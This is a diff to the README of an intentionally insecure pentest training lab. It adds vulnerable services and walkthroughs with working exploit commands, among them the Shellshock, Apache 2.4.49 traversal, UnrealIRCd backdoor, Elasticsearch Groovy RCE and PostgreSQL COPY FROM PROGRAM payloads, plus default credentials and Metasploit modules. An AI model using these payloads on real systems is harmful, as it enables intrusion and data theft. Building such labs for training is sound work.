@@ -12,7 +12,8 @@ separate Kali box scans the VM IPs like ordinary targets.
         |             |             |             |
      web01 VM     files01 VM     app01 VM      desk01 VM
    DVWA/FTP/SSH   NFS/SMB/       WordPress/    X11 (open)/
-                  Redis/SNMP     Tomcat/MySQL  RDP (weak)
+   vsftpd234/     Redis/SNMP/    Tomcat/MySQL  RDP/VNC/shell
+   shellshock     ES/Mongo/IRC   Postgres/Grafana
 ```
 
 > ⚠️ Every image here is **intentionally insecure**. Run the VMs on an isolated
@@ -31,6 +32,9 @@ three IPs are what you scan. The loot refers to the boxes by the hostnames
 |             | SSH            | 22/tcp    | `root` / `root`         | weak SSH creds                         |
 |             | Werkzeug       | 5000/tcp  | PIN `1234`              | Flask debug console → RCE              |
 |             | wp2shell (WP 6.9.0) | 8080/tcp | `admin` / `Summer2026!` | **CVE-2026-63030** REST batch route confusion, **CVE-2026-60137** blind SQLi via `author__not_in` → plugin upload RCE |
+|             | vsftpd 2.3.4   | 2121/tcp  | `jsmith`/`password123`  | **CVE-2011-2523** smiley backdoor      |
+|             | httpd 2.4.49   | 8081/tcp  | none                    | **CVE-2021-41773** traversal + RCE     |
+|             | Shellshock CGI | 8082/tcp  | none                    | **CVE-2014-6271** bash env RCE         |
 | **files01** | NFS export     | 2049/tcp  | `/data`, `rw,*`         | **open NFS share** (no_root_squash)    |
 |             | Samba `public` | 445,139   | guest, writable         | anonymous SMB share                    |
 |             | Redis          | 6379/tcp  | no auth                 | unauthenticated Redis (→ RCE/key write)|
@@ -42,13 +46,23 @@ three IPs are what you scan. The loot refers to the boxes by the hostnames
 |             | IMAP (James)   | 143/tcp   | LDAP user list          | weak creds, brute-forceable            |
 |             | James admin    | 4555/tcp  | `root`/`root`           | default admin creds → user mgmt        |
 |             | IPMI 2.0 (BMC) | 623/udp   | `admin`/`admin`, `ADMIN`/`ADMIN`, `root`/`root` | **CVE-2013-4786** RAKP hash retrieval + **CVE-2013-4782** cipher zero |
+|             | rsync          | 873/tcp   | anonymous, writable     | open rsync module (read+write)         |
+|             | TFTP           | 69/udp    | anonymous               | device configs w/ creds                |
+|             | UnrealIRCd     | 6667/tcp  | none                    | **CVE-2010-2075** `AB` backdoor RCE    |
+|             | MongoDB 3.6    | 27017/tcp | no auth                 | seeded intranet creds                  |
+|             | memcached      | 11211     | no auth                 | unauth memcached (tcp+udp)             |
+|             | Elasticsearch  | 9200/tcp  | no auth                 | 1.4.2: **CVE-2015-1427** Groovy RCE    |
 | **app01**   | WordPress 4.6  | 80/tcp    | set during install      | outdated WP core/plugins (CVEs)        |
 |             | Tomcat Manager | 8080/tcp  | `tomcat` / `tomcat`     | default manager creds → WAR-to-shell   |
 |             | MySQL          | 3306/tcp  | `root` / `root`         | weak DB root creds                     |
 |             | Brocade FWS624 | 23/tcp    | `username`/`password`   | weak telnet creds, config disclosure   |
+|             | PostgreSQL 13  | 5432/tcp  | `postgres`/`postgres`   | **COPY FROM PROGRAM** RCE              |
+|             | distccd 2.18.3 | 3632/tcp  | none                    | **CVE-2004-2687** unauth RCE           |
+|             | Grafana 8.0.0  | 3000/tcp  | `admin`/`admin`         | **CVE-2021-43798** path traversal      |
 | **desk01**  | X11            | 6000/tcp  | none (access control off)| open X display → screenshot/keylog    |
 |             | RDP (xrdp)     | 3389/tcp  | `ubuntu` / `ubuntu`     | weak RDP creds                         |
 |             | VNC (x11vnc)   | 5900/tcp  | `password`              | weak VNC password                      |
+|             | bind shell     | 65534/tcp | none                    | **planted backdoor** -> bash as jsmith |
 
 \* DVWA: browse to `http://<web01-ip>/setup.php` once, click **Create / Reset
 Database**, then log in with `admin` / `password`.
@@ -71,17 +85,19 @@ on purpose (as real users do), so a found password is worth trying elsewhere.
 | `root` / `root`          | SSH (web01) — the default          | `backups/web01-shadow.bak` cracks to this too          |
 | `trogdon` / `ttrogdon`       | Brocade (app01), LDAP bind (files01)  | LDAP `uid=trogdon` (anon-visible uid); Brocade `show config` output |
 | `dmudd` / `crazypassword`    | Brocade (app01), LDAP bind (files01)  | LDAP `uid=dmudd`; Brocade `show config` output          |
-| `svc-backup` / `Backup2024!` | LDAP bind (files01)                   | LDAP `uid=svc-backup` `description` field (anonymous-readable) |
+| `svc-backup` / `Backup2024!` | LDAP bind (files01)                   | LDAP `uid=svc-backup` `description` field (anonymous-readable); PostgreSQL `service_accounts` (app01) |
+| `wp_admin` / `Summer2026!`   | WordPress (web01 wp2shell) — same password as `admin` | PostgreSQL `service_accounts` (app01) |
+| `tomcat-deploy` / `admin123` | Tomcat Manager (app01, same password as `admin`) | PostgreSQL `service_accounts` (app01); MongoDB `intranet.config` (files01) |
 
 WordPress accounts only go live after you seed them (see the app01 deploy step).
 
 ## Repository layout
 
 ```
-web01/     -> deploy on the web01 VM   (docker-compose.yml + ssh-setup.sh + ftp/)
-files01/   -> deploy on the files01 VM (docker-compose.yml + snmp + nfs/ + smb/)
-app01/     -> deploy on the app01 VM   (docker-compose.yml + tomcat-setup.sh + wp_seed_users.sql)
-desk01/    -> deploy on the desk01 VM  (docker-compose.yml + x11/ + rdp/ Dockerfiles)
+web01/     -> deploy on the web01 VM   (docker-compose.yml + ssh-setup.sh + ftp/ + vsftpd234/ + httpd2449/ + shellshock/)
+files01/   -> deploy on the files01 VM (docker-compose.yml + snmp + nfs/ + smb/ + rsyncd/ + tftp/ + unrealircd/ + mongo/ + elasticsearch/)
+app01/     -> deploy on the app01 VM   (docker-compose.yml + tomcat-setup.sh + wp_seed_users.sql + distccd/ + postgres/)
+desk01/    -> deploy on the desk01 VM  (docker-compose.yml + x11/ + rdp/ + vnc/ + shell/ Dockerfiles)
 docker_start_instance.sh  -> helper: ./docker_start_instance.sh <box> [action]
 ```
 
@@ -101,8 +117,9 @@ into the right folder).
   echo -e "nfs\nnfsd" | sudo tee /etc/modules-load.d/nfs.conf   # persist on reboot
   ```
   The James mail container downloads the Apache James 2.3.2 binary at build time
-  so this VM also needs internet on first `up --build`. Stop any local MTA before
-  bringing James up so port 25 is free:
+  and the UnrealIRCd/Elasticsearch images download their (sha1-pinned) source
+  tarballs, so this VM needs internet on first `up --build`. Stop any local MTA
+  before bringing James up so port 25 is free:
   ```bash
   sudo systemctl stop postfix exim4 2>/dev/null || true
   sudo systemctl disable postfix exim4 2>/dev/null || true
@@ -172,7 +189,8 @@ prints the next step. The manual equivalents are below.
 ```bash
 cd web01
 # edit docker-compose.yml: set ftp ADDRESS to THIS VM's LAN IP (passive FTP)
-docker compose up -d   # builds wp2shell on first run (needs internet for WP-CLI)
+docker compose up -d   # builds wp2shell (needs internet for WP-CLI) and the
+                       # vsftpd-2.3.4 / shellshock images (download pinned source)
 # DVWA: open http://<web01-ip>/setup.php and click Create/Reset Database
 # wp2shell: give it ~a minute to auto-install, then http://<web01-ip>:8080/
 ```
@@ -205,7 +223,7 @@ Assumes a minimal Ubuntu Server guest.
 | VM      | vCPU | RAM    | Disk  | Why                                            |
 |---------|------|--------|-------|------------------------------------------------|
 | web01   | 1    | 1 GB   | 8 GB  | Apache/PHP/MySQL (DVWA) + FTP + SSH, all light.|
-| files01 | 1    | 1 GB   | 4 GB  | NFS + Samba + Redis + SNMP are tiny.           |
+| files01 | 1    | 2 GB   | 4 GB  | Tiny services; the ES JVM wants the RAM.       |
 | app01   | 2    | 2 GB   | 12 GB | MySQL + Tomcat JVM + WordPress together.       |
 | desk01  | 2    | 2 GB   | 14 GB | xfce desktop + X server; image build is chunky.|
 
@@ -239,6 +257,29 @@ nmap -sU -p161 <files01-ip>                          # SNMP is UDP
   ```
   The PIN is intentionally weak (`1234`). In a real engagement you'd compute it
   from `/proc/net/arp`, `/etc/machine-id`, and the app's `/proc/self/cgroup`.
+- vsftpd 2.3.4 (port 2121 — **CVE-2011-2523** smiley backdoor):
+  ```bash
+  ftp <web01-ip> 2121
+  # username: anything:)    password: anything   → backdoor shell opens on 6200
+  nc <web01-ip> 6200      # id → uid=0(root)
+  # or: use exploit/unix/ftp/vsftpd_234_backdoor  (set RPORT 2121)
+  ```
+  Legit logins still work (`jsmith`/`password123`) — the backdoor only fires
+  when the username contains `:)`.
+- httpd 2.4.49 (port 8081 — **CVE-2021-41773** path traversal → RCE):
+  ```bash
+  curl --path-as-is 'http://<web01-ip>:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'
+  curl --path-as-is 'http://<web01-ip>:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' \
+    -d 'echo Content-Type: text/plain; echo; id'      # RCE as daemon
+  # or: use exploit/multi/http/apache_normalize_path_rce  (set RPORT 8081)
+  ```
+- Shellshock CGI (port 8082 — **CVE-2014-6271**, unpatched bash 4.3):
+  ```bash
+  curl -H 'User-Agent: () { :; }; echo; echo; /usr/bin/id' \
+    http://<web01-ip>:8082/cgi-bin/status              # RCE as www-data
+  # or: use exploit/multi/http/apache_mod_cgi_bash_env_exec
+  #     (set RPORT 8082, TARGETURI /cgi-bin/status)
+  ```
 
 **files01**
 - Juniper SSG5 (port 23):
@@ -359,6 +400,47 @@ nmap -sU -p161 <files01-ip>                          # SNMP is UDP
   ```
   Valid usernames to probe: `admin`, `Admin`, `ADMIN`, `root`, `jsmith`.
   Cracked hashes reuse passwords already on other services (credential reuse chain).
+- rsync (port 873 — anonymous, listable, **writable**):
+  ```bash
+  rsync rsync://<files01-ip>/                          # list modules
+  rsync -av rsync://<files01-ip>/backup/ ./loot/       # pull everything
+  rsync -av shell.php rsync://<files01-ip>/backup/     # it's writable, too
+  ```
+  `share/scripts/backup.sh` and `share/docs/onboarding.txt` leak creds reused on
+  other boxes. No msf module needed — it's just rsync.
+- TFTP (UDP 69 — anonymous read/write, no auth by design):
+  ```bash
+  tftp <files01-ip> -c get configs/core-sw01.cfg
+  tftp <files01-ip> -c get configs/edge-fw01.cfg
+  # or: use auxiliary/scanner/tftp/tftpbrute   (guesses filenames)
+  ```
+  Switch/firewall configs leak enable + telnet passwords.
+- UnrealIRCd 3.2.8.1 (port 6667 — **CVE-2010-2075** supply-chain backdoor):
+  ```bash
+  printf 'AB;id\n' | nc <files01-ip> 6667   # any line starting AB → system()
+  # (output leaks back over the socket; runs as the ircd user)
+  # or: use exploit/unix/irc/unreal_ircd_3281_backdoor
+  ```
+- MongoDB 3.6 (port 27017 — no auth):
+  ```bash
+  mongosh mongodb://<files01-ip>/intranet --eval 'db.users.find(); db.config.find()'
+  # or: use auxiliary/scanner/mongodb/mongodb_login
+  ```
+  `intranet.users` / `intranet.config` hold creds reused on web01/app01.
+- memcached (port 11211, tcp **and** udp — no auth):
+  ```bash
+  printf 'version\r\nstats items\r\n' | nc <files01-ip> 11211
+  # or: use auxiliary/gather/memcached_extractor
+  ```
+  The UDP responder is enabled on purpose — classic amplification-reflection
+  talking point (2018 memcached DDoS wave).
+- Elasticsearch 1.4.2 (port 9200 — no auth + **CVE-2015-1427** Groovy RCE):
+  ```bash
+  curl http://<files01-ip>:9200/intranet/_search?pretty        # dump seeded creds
+  curl -XPOST http://<files01-ip>:9200/_search -d '{"size":1,
+    "script_fields":{"x":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}'
+  # or: use exploit/multi/elasticsearch/search_groovy_script   (CVE-2015-1427)
+  ```
 
 **app01**
 - Brocade FWS624 / ICX6450 (port 23):
@@ -379,6 +461,28 @@ nmap -sU -p161 <files01-ip>                          # SNMP is UDP
   `admin`/`admin123` (the cracked `.htpasswd`). Deploy a JSP/WAR payload (e.g.
   from `msfvenom -p java/jsp_shell_reverse_tcp`).
 - `mysql -h <app01-ip> -uroot -proot`.
+- PostgreSQL 13 (port 5432 — `postgres`/`postgres`):
+  ```bash
+  psql -h <app01-ip> -U postgres            # password: postgres
+  # payroll + service_accounts tables leak creds reused on other boxes
+  # RCE as the postgres OS user (superuser COPY FROM PROGRAM):
+  #   CREATE TABLE rce(o text);
+  #   COPY rce FROM PROGRAM 'id';
+  #   TABLE rce;
+  # or: use exploit/linux/postgres/postgres_payload
+  ```
+- distccd 2.18.3 (port 3632 — **CVE-2004-2687**, unauth "compile jobs" = RCE):
+  ```bash
+  use exploit/unix/misc/distcc_exec         # shell as the distcc user
+  # Metasploitable2 staple; by-design command execution, no creds needed
+  ```
+- Grafana 8.0.0 (port 3000 — `admin`/`admin` + **CVE-2021-43798** traversal):
+  ```bash
+  curl --path-as-is \
+    'http://<app01-ip>:3000/public/plugins/alertlist/../../../../../../../../etc/passwd'
+  # or: use auxiliary/scanner/http/grafana_plugin_traversal
+  # then log in admin/admin → dashboards / datasources / plugins
+  ```
 
 **desk01**
 - X11 (open display, no auth — `nmap -p6000` shows it):
@@ -404,6 +508,13 @@ nmap -sU -p161 <files01-ip>                          # SNMP is UDP
   ```
   The VNC desktop shows a sticky note leaking the `backup`/`letmein` credential
   (also valid on web01 SSH and FTP — credential reuse chain).
+- Bind shell (port 65534 — simulated planted backdoor, no auth):
+  ```bash
+  nc <desk01-ip> 65534          # straight to bash as jsmith
+  # socat-based, forks per connection: survives disconnects, serves concurrent
+  # sessions. The "find the persistence mechanism" exercise — spot it with:
+  nmap -sV -p65534 <desk01-ip>  # or a full -p- sweep
+  ```
 
 ### Add a vulnerable WordPress plugin (optional, makes app01 meatier)
 After the wizard, drop an old plugin with a known CVE into the running container:
